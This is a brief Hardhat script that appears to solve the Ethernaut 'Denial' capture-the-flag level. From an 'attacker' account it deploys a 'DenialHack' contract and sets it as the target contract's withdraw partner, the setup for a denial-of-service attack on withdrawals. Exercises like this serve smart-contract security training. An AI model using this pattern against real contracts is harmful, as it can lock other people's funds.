import { fail } from "assert";
import { ethers } from "hardhat";

async function denialScript() {
  const denialAddress = process.env.DENIAL_ADDRESS || fail("DENIAL_ADDRESS Not Found In .env");
  const [attacker] = await ethers.getSigners();
  const denial = await ethers.getContractAt("Denial", denialAddress);
  const DenialHack = await ethers.getContractFactory("DenialHack");
  const denialHack = await DenialHack.connect(attacker).deploy();
  await denialHack.deployed();

  let tx = await denial.setWithdrawPartner(denialHack.address);
  await tx.wait(1);

  console.log("SUCCESS!!! Submit the instance.");
}

denialScript().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
